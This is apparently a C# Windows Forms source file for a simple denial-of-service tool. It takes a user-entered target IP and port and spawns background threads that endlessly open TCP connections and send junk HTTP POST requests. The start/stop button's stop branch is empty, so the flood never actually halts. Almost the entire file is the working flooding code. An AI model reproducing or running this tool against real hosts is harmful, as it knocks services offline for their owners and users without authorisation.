﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Net;

namespace DOS
{
    public partial class Form1 : Form
    {
        private string target_ip = "192.168.0.1";    //  Target host
        private int port = 80;    //  Target port
        private int threads = 1;   //  Amount of threads
        private int counter = 0;
        private Bitmap image = new Bitmap(@".\resource\andromedawan.jpg");
        //private Bitmap image = new Bitmap(@".\resource\giammarco-boscaro-378319.jpg");

        public Form1()
        {
            InitializeComponent();
            Debug.WriteLine("POST / HTTP/1.1\r\nHost:{0}\r\nPort:{1}\r\n\r\n",target_ip,port);
            pictureBox_previewBox.SizeMode = PictureBoxSizeMode.StretchImage;
            pictureBox_previewBox.Image = image;
            label1.Text = "Status : stop";
            
        }

        //  function:download url image and return as bitmap(None on use)
        public Bitmap webimg(string uri)
        {
            try
            {
                WebClient downloader = new WebClient();
                Stream imageStream = downloader.OpenRead(uri);
                Bitmap downloadImage = Bitmap.FromStream(imageStream) as Bitmap;
                pictureBox_previewBox.Image = image;
                return downloadImage;
            }catch(Exception)
            {
                return null;
            }
        }

        //  function:DOS
        public int DOS(bool trigger)
        {
            if(trigger == true)
            {
                for (int i = 0; i < threads; i++)
                {
                    new Thread(() =>
                    {
                        Thread.CurrentThread.IsBackground = true;

                        while (true)
                        {
                            try
                            {
                                Debug.WriteLine("try");
                                TcpClient client = new TcpClient();
                                client.NoDelay = true;
                                client.Connect(target_ip, port);
                                StreamWriter sw = new StreamWriter(client.GetStream());
                                sw.Write("\r\n\r\nPOST / HTTP/1.1\r\nHost:" + target_ip + "\r\n\r\n" + "image:" + image);
                                sw.Flush();
                                client.Close();
                            }
                            catch (Exception)
                            {
                                //  Maybe..., the target server is down.
                                //  Or invalid I/O.
                            }
                        }
                    }).Start();
                }
            }
            else
            {
                
            }
            return 0;
        }

        //  event:click / start or stop DOS
        private void DosStart_Stop_Click(object sender, EventArgs e)
        {
            counter += 1;
            if (counter >= 2) counter = 0;
            if ((counter % 2) == 0)
            {
                label1.Text = "Status : false"; Debug.WriteLine("Status : false");
                DOS(false);
            }
            else
            {
                label1.Text = "Status : true"; Debug.WriteLine("Status : true");
                DOS(true);
            }
        }

        //  event:click / refresh target_ip/port
        private void button1_Click(object sender, EventArgs e)
        {
            target_ip = textBox_Host.Text;
            port = Int32.Parse(textBox_Port.Text);
            Debug.WriteLine("POST / HTTP/1.1\r\nHost:{0}\r\nPort:{1}\r\n\r\n",target_ip,port);
        }
    }
}
